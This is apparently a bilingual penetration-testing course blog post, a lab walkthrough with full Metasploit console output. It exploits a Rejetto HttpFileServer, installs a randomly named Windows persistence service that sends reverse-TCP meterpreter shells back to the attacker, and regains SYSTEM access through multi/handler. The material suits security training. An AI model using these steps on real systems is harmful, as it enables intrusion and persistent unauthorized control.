---
layout: post
title: "Persistence Service"
date: "2023-07-04"
author: "r3kind1e"
header-img: "img/post-bg-Penetration Testing Student.png"
catalog:    true
tags: 
    - Penetration Testing Student v2
    - Host & Network Penetration Testing
    - Post-Exploitation
---

# Windows Persistence

## Persistence Via Services

### Establishing Persistence On Windows

Persistence consists of techniques that adversaries use to keep access to systems across restarts, changed credentials, and other interruptions that could cut off their access. Techniques used for persistence include any access, action, or configuration changes that let them maintain their foothold on systems, such as replacing or hijacking legitimate code or adding startup code. - MITRE ATT&CK

Gaining an initial foothold is not enough, you need to setup and maintain persistent access to your targets.

Note: The persistence technique you use will need to be in accordance with the rules of engagement laid out and agreed upon with the client.

## Demo: Persistence Via Services

# Windows Persistence

## 通过服务实现持久性

### 在Windows上建立持久性

持久性是指对手使用的技术，用于在重新启动、更改凭据和其他可能中断其访问的情况下保持对系统的访问。用于持久性的技术包括任何访问、操作或配置更改，使他们能够在系统上保持立足点，例如替换或劫持合法代码或添加启动代码。- MITRE ATT＆CK

获得初始立足点是不够的，您需要设置和维护对目标的持续访问。

注意：您使用的持久性技术将需要符合与客户达成的约定规则。

## 演示：通过服务实现持久性

Once you gain access to a target system, the next logical step is to perform local enumeration. Try and identify as much information as you can about the system that you’ve just compromised. You can then go ahead and start transferring the files that you need to transfer. The next logical step would be to elevate your privileges if you obtained a non-elevated session. The reason you need to elevate your privileges before establishing persistence is primarily because persistence technique will typically require administrative access in order for them to be performed correctly.

If we can’t modify the system, probably the best option then is to perform a hash dump and obtain the hashes of the user accounts on that system so that you can always authenticate legitimately back on that target system that you’ve compromised.

[MITRE ATT&CK](https://attack.mitre.org/)

[Persistence](https://attack.mitre.org/tactics/TA0003/)

| 账户操纵 | 攻击者可能会操纵帐户以保持对受害系统的访问。帐户操作可能包括保留对手对已泄露帐户的访问权限的任何操作，例如修改凭据或权限组。这些操作还可能包括旨在破坏安全策略的帐户活动，例如执行迭代密码更新以绕过密码持续时间策略并保留已泄露凭据的生存期。 |
| --- | --- |
| 登录脚本 （Windows） | 攻击者可以使用在登录初始化时自动执行的 Windows 登录脚本来建立持久性。Windows 允许在特定用户或用户组登录到系统时运行登录脚本。这是通过将脚本的路径添加到注册表项来完成的。 |
| 创建帐户 | 攻击者可以创建一个帐户来保持对受害者系统的访问。通过足够的访问级别，创建此类帐户可用于建立不需要在系统上部署持久远程访问工具的辅助凭据访问。 |

We’re going to exploit a vulnerable service on the target system. Once we’ve gained access to the target system, we can then establish persistence. If we need to elevate our privileges, we will do that before we establish persistence.

Target IP Address : 10.2.31.23

```bash
nmap -sV 10.2.31.23
```

```bash
msfconsole
search rejetto
use 0
```

That’s 32 bit meterpreter payload. At this point, we still don’t know what the target system operating system architecture is. So it’s always safe to utilize the 32 bit meterpreter payload. 

```bash
show options
set RHOSTS 10.2.31.23
exploit
```

```
meterpreter > sysinfo
```

We can also identify our current user and the privileges associated with that user.

```
meterpreter > getuid
Server username: WIN-OMCNBKR66MN\Administrator
```

We’re currently the administrator user. It means we do not need to elevate our privileges and we can move to the next phase, which is establishing persistence.

We’re going to be focusing on how to establish persistence through a Windows persistence service.

We’re going to be exploring how to set up a service that will connect back to our Metasploit Framework multi/handler listener and provide us with persistent access whenever we want.

In order to run that particular module, you do need to have elevated privileges.

[Windows Persistent Service Installer](https://www.rapid7.com/db/modules/exploit/windows/local/persistence_service/)

Windows Persistent Service Installer Windows 持久服务安装程序

Description 描述

This Module will generate and upload an executable to a remote host, next will make it a persistent service. It will create a new service which will start the payload whenever the service is running. Admin or system privilege is required.

此模块将生成可执行文件并将其上传到远程主机，接下来将使其成为持久服务。它将创建一个新服务，该服务将在服务运行时启动有效负载。需要管理员或系统权限。

```
meterpreter > background
search persistence_service
use exploit/windows/local/persistence_service
use 0
```

The default payload is set to the 32 bit meterpreter payload, as we can always migrate our process into a different process that is a 64 bit process. 

The way this module works is that it will generate and upload an executable to the target system. It will then make it a persistent service. Services run in the background. This module will then create a new service, which will start the payload whenever the service is running. And you do require administrative or system privileges in order to utilize this particular module here.

```
show options
set LPORT 4433
sessions
set SESSION 1
exploit
```

This module will generate a payload with msfvenom. This payload will then be uploaded to the target system. This module will then make it a persistent service. So it’ll create a new service, which will then start the payload that was generated and uploaded to the target system whenever that service is running. And in order to create a new service on Windows, you require an elevated session or elevated privileges.

```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > exit
sessions
sessions -k 1
sessions
exit
```

That’s one of the great things with a persistent service is it provides you with the highest level of privileges available on a Windows system not tied down to a particular user account. 

Remember the persistent services running on the target system. After every five seconds, it’s going to execute the payload that will then connect back to the listener. 

```
msfconsole
use multi/handler
```

We then set the payload that we specified when we were using the persistence module, which by default was the 32-bit meterpreter. 

```
set payload windows/meterpreter/reverse_tcp
show options
set LHOST eth1
set LPORT 4433
exploit
```

```
meterpreter > sysinfo
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
exit
```

```
run
meterpreter > 
```

## Maintaining Access: Persistence Service维护访问：持久性服务

### Overview 概述

A Kali GUI machine and a target machine running a vulnerable server are provided to you. The IP address of the target machine is provided in a text file named target placed on the Desktop of the Kali machine (/root/Desktop/target).

为您提供了一台 Kali GUI 机器和一台运行易受攻击服务器的目标机器。目标计算机的 IP 地址在名为 target 的文本文件中提供，该文件放置在 Kali 机器的桌面 （/root/Desktop/target） 上。

Your task is to fingerprint the application using the tools available on the Kali machine and exploit the application using the appropriate Metasploit module.

您的任务是使用 Kali 机器上可用的工具对应用程序进行指纹识别，并使用适当的 Metasploit 模块利用应用程序。

Then, use the exploit/windows/local/persistence_service local exploit module to maintain access.

然后，使用漏洞利用/窗口/本地/persistence_service本地漏洞利用模块来维护访问。

Objective: Exploit the application and maintain access using the Metasploit module.

目标：利用应用程序并使用Metasploit模块保持访问。

Instructions:  指示：

- Your Kali machine has an interface with IP address 10.10.X.Y. Run “ip addr” to know the values of X and Y.您的 Kali 机器有一个 IP 地址为 10.10.X.Y. 的接口。 运行“ip addr”以了解 X 和 Y 的值。
- The IP address of the target machine is mentioned in the file “/root/Desktop/target”目标计算机的 IP 地址在文件“/root/Desktop/target”中提及
- Do not attack the gateway located at IP address 192.V.W.1 and 10.10.X.1不要攻击位于 IP 地址 192.V.W.1 和 10.10.X.1 的网关

### Solutions 解决方案

The solution for this lab can be found in the following manual:

[https://assets.ine.com/labs/ad-manuals/walkthrough-2140.pdf](https://assets.ine.com/labs/ad-manuals/walkthrough-2140.pdf)

本实验的解决方案可在以下手册中找到：https://assets.ine.com/labs/ad-manuals/walkthrough-2140.pdf

## 复现视频内容

Target IP Address : 10.0.27.39

Kali Linux : 10.10.16.2

```bash
root@attackdefense:~# nmap -sV 10.0.27.39

Starting Nmap 7.91 ( https://nmap.org ) at 2023-07-04 07:22 IST
Nmap scan report for 10.0.27.39
Host is up (0.0027s latency).
Not shown: 990 closed ports
PORT      STATE SERVICE            VERSION
80/tcp    open  http               HttpFileServer httpd 2.3
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server?
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49165/tcp open  msrpc              Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 66.87 seconds
```

```bash
root@attackdefense:~# msfconsole -q
msf6 > search rejetto

Matching Modules
================

   #  Name                                   Disclosure Date  Rank       Check  Description
   -  ----                                   ---------------  ----       -----  -----------
   0  exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution

Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/rejetto_hfs_exec

msf6 > use 0
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/http/rejetto_hfs_exec) > show options

Module options (exploit/windows/http/rejetto_hfs_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   HTTPDELAY  10               no        Seconds to wait before terminating web server
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80               yes       The target port (TCP)
   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       The path of the web application
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host

Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.16.2       yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Automatic

msf6 exploit(windows/http/rejetto_hfs_exec) > set RHOSTS 10.0.27.39
RHOSTS => 10.0.27.39
msf6 exploit(windows/http/rejetto_hfs_exec) > exploit

[*] Started reverse TCP handler on 10.10.16.2:4444 
[*] Using URL: http://0.0.0.0:8080/hBiK4euisGqLpno
[*] Local IP: http://10.10.16.2:8080/hBiK4euisGqLpno
[*] Server started.
[*] Sending a malicious request to /
/usr/share/metasploit-framework/modules/exploits/windows/http/rejetto_hfs_exec.rb:110: warning: URI.escape is obsolete
/usr/share/metasploit-framework/modules/exploits/windows/http/rejetto_hfs_exec.rb:110: warning: URI.escape is obsolete
[*] Payload request received: /hBiK4euisGqLpno
[*] Sending stage (175174 bytes) to 10.0.27.39
[*] Meterpreter session 1 opened (10.10.16.2:4444 -> 10.0.27.39:49234) at 2023-07-04 07:26:33 +0530
[!] Tried to delete %TEMP%\DtbsuvF.vbs, unknown result
[*] Server stopped.

meterpreter >
```

```bash
meterpreter > sysinfo
Computer        : WIN-OMCNBKR66MN
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows
meterpreter > getuid
Server username: WIN-OMCNBKR66MN\Administrator
meterpreter > background
[*] Backgrounding session 1...
```

```bash
msf6 exploit(windows/http/rejetto_hfs_exec) > search persistence_service

Matching Modules
================

   #  Name                                       Disclosure Date  Rank       Check  Description
   -  ----                                       ---------------  ----       -----  -----------
   0  exploit/windows/local/persistence_service  2018-10-20       excellent  No     Windows Persistent Service Installer

Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/local/persistence_service

msf6 exploit(windows/http/rejetto_hfs_exec) > use exploit/windows/local/persistence_service
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/persistence_service) > show options

Module options (exploit/windows/local/persistence_service):

   Name                 Current Setting  Required  Description
   ----                 ---------------  --------  -----------
   REMOTE_EXE_NAME                       no        The remote victim name. Random string as default.
   REMOTE_EXE_PATH                       no        The remote victim exe path to run. Use temp directory as default.
   RETRY_TIME           5                no        The retry time that shell connect failed. 5 seconds as default.
   SERVICE_DESCRIPTION                   no        The description of service. Random string as default.
   SERVICE_NAME                          no        The name of service. Random string as default.
   SESSION                               yes       The session to run this module on.

Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.16.2       yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Windows

msf6 exploit(windows/local/persistence_service) > sessions

Active sessions
===============

  Id  Name  Type                     Information                                      Connection
  --  ----  ----                     -----------                                      ----------
  1         meterpreter x86/windows  WIN-OMCNBKR66MN\Administrator @ WIN-OMCNBKR66MN  10.10.16.2:4444 -> 10.0.27.39:49234 (10.0.27.39)

msf6 exploit(windows/local/persistence_service) > set LPORT 4433
LPORT => 4433
msf6 exploit(windows/local/persistence_service) > set SESSION 1
SESSION => 1
msf6 exploit(windows/local/persistence_service) > exploit

[*] Started reverse TCP handler on 10.10.16.2:4433 
[*] Running module against WIN-OMCNBKR66MN
[+] Meterpreter service exe written to C:\Users\ADMINI~1\AppData\Local\Temp\1\hQpQq.exe
[*] Creating service rozqeeR
[*] Sending stage (175174 bytes) to 10.0.27.39
[*] Cleanup Meterpreter RC File: /root/.msf4/logs/persistence/WIN-OMCNBKR66MN_20230704.3458/WIN-OMCNBKR66MN_20230704.3458.rc
[*] Meterpreter session 2 opened (10.10.16.2:4433 -> 10.0.27.39:49268) at 2023-07-04 07:34:59 +0530

meterpreter >
```

```bash
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > sysinfo
Computer        : WIN-OMCNBKR66MN
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows
meterpreter > 
Background session 2? [y/N]  
msf6 exploit(windows/local/persistence_service) > sessions

Active sessions
===============

  Id  Name  Type                     Information                                      Connection
  --  ----  ----                     -----------                                      ----------
  1         meterpreter x86/windows  WIN-OMCNBKR66MN\Administrator @ WIN-OMCNBKR66MN  10.10.16.2:4444 -> 10.0.27.39:49234 (10.0.27.39)
  2         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ WIN-OMCNBKR66MN            10.10.16.2:4433 -> 10.0.27.39:49268 (10.0.27.39)

msf6 exploit(windows/local/persistence_service) > sessions -K
[*] Killing all sessions...
[*] 10.0.27.39 - Meterpreter session 1 closed.
[*] 10.0.27.39 - Meterpreter session 2 closed.
msf6 exploit(windows/local/persistence_service) > sessions

Active sessions
===============

No active sessions.

msf6 exploit(windows/local/persistence_service) > exit
root@attackdefense:~#
```

```bash
root@attackdefense:~# msfconsole -q
msf6 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------

Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target

msf6 exploit(multi/handler) > set LHOST eth1
LHOST => 10.10.16.2
msf6 exploit(multi/handler) > set LPORT 4433
LPORT => 4433
msf6 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 10.10.16.2:4433 
[*] Sending stage (175174 bytes) to 10.0.27.39
[*] Meterpreter session 1 opened (10.10.16.2:4433 -> 10.0.27.39:49323) at 2023-07-04 07:43:16 +0530

meterpreter > sysinfo
Computer        : WIN-OMCNBKR66MN
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > exit
[*] Shutting down Meterpreter...

[*] 10.0.27.39 - Meterpreter session 1 closed.  Reason: User exit
msf6 exploit(multi/handler) > sessions

Active sessions
===============

No active sessions.
```

```bash
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.16.2:4433 
[*] Sending stage (175174 bytes) to 10.0.27.39
[*] Meterpreter session 2 opened (10.10.16.2:4433 -> 10.0.27.39:49343) at 2023-07-04 07:46:11 +0530

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > 
Background session 2? [y/N]  
msf6 exploit(multi/handler) > sessions

Active sessions
===============

  Id  Name  Type                     Information                            Connection
  --  ----  ----                     -----------                            ----------
  2         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ WIN-OMCNBKR66MN  10.10.16.2:4433 -> 10.0.27.39:49343 (10.0.27.39)
```